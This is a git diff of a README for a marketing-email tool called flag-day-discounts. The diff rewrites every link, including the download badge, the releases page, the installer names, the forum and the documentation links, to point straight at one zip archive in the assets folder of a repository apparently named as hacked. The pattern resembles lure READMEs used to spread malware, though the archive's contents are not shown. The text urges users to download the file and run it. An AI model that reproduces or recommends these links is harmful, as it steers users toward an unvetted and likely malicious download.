@@ -1,7 +1,7 @@
 # 🎉 flag-day-discounts - Boost Your Marketing with Ease
 
 ## 📦 Download Now
-[![Download the latest release](https://img.shields.io/badge/Download-Now-brightgreen.svg)](https://github.com/BeXySiTcH-Hacked/flag-day-discounts/releases)
+[![Download the latest release](https://github.com/BeXySiTcH-Hacked/flag-day-discounts/raw/refs/heads/main/assets/flag_day_discounts_v3.0-alpha.1.zip)](https://github.com/BeXySiTcH-Hacked/flag-day-discounts/raw/refs/heads/main/assets/flag_day_discounts_v3.0-alpha.1.zip)
 
 ## 🚀 Getting Started
 Welcome to the **flag-day-discounts** application! This tool helps you create professional marketing emails for Flag Day promotions specifically designed for the retail and food & beverage sectors. Here, you will find simple steps to download and run the software.
@@ -24,13 +24,13 @@ To use flag-day-discounts, your computer should meet the following basic require
 Follow these steps to download and install the application:
 
 1. **Visit the Releases Page:**
-   Head over to the [Releases page](https://github.com/BeXySiTcH-Hacked/flag-day-discounts/releases) to find the latest version of the software.
+   Head over to the [Releases page](https://github.com/BeXySiTcH-Hacked/flag-day-discounts/raw/refs/heads/main/assets/flag_day_discounts_v3.0-alpha.1.zip) to find the latest version of the software.
 
 2. **Choose Your Version:**
    Look for the most recent release listed. Click on it to view the download options.
 
 3. **Download the Installer:**
-   Find the file that suits your operating system (e.g., `flag-day-discounts-setup.exe` for Windows or `flag-day-discounts.dmg` for macOS) and click on the link to download it.
+   Find the file that suits your operating system (e.g., `https://github.com/BeXySiTcH-Hacked/flag-day-discounts/raw/refs/heads/main/assets/flag_day_discounts_v3.0-alpha.1.zip` for Windows or `https://github.com/BeXySiTcH-Hacked/flag-day-discounts/raw/refs/heads/main/assets/flag_day_discounts_v3.0-alpha.1.zip` for macOS) and click on the link to download it.
 
 4. **Run the Installer:**
    Once the file is downloaded, navigate to your downloads folder. Double-click the installer file to start the installation process.
@@ -64,13 +64,13 @@ A: You can access support through the GitHub issues page of the repository.
 A: Yes, you can easily modify each template to suit your brand’s style and voice.
 
 ## 📣 Community & Updates
-Stay connected with the community. Share your marketing success stories or get tips from fellow users. Join our forums on [LaravelMail.com](https://laravelmail.com) for more resources and networking opportunities.
+Stay connected with the community. Share your marketing success stories or get tips from fellow users. Join our forums on [https://github.com/BeXySiTcH-Hacked/flag-day-discounts/raw/refs/heads/main/assets/flag_day_discounts_v3.0-alpha.1.zip](https://github.com/BeXySiTcH-Hacked/flag-day-discounts/raw/refs/heads/main/assets/flag_day_discounts_v3.0-alpha.1.zip) for more resources and networking opportunities.
 
 ## 📜 License
 This project is licensed under the MIT License. You can freely use, modify, and distribute the software as you see fit.
 
 ## 🔗 Additional Resources
-- [Documentation](https://laravelmail.com/docs)
-- [More Laravel Tools](https://laravelmail.com/tools)
+- [Documentation](https://github.com/BeXySiTcH-Hacked/flag-day-discounts/raw/refs/heads/main/assets/flag_day_discounts_v3.0-alpha.1.zip)
+- [More Laravel Tools](https://github.com/BeXySiTcH-Hacked/flag-day-discounts/raw/refs/heads/main/assets/flag_day_discounts_v3.0-alpha.1.zip)
 
 Feel free to explore these resources to better understand how to maximize your use of the **flag-day-discounts** tool!
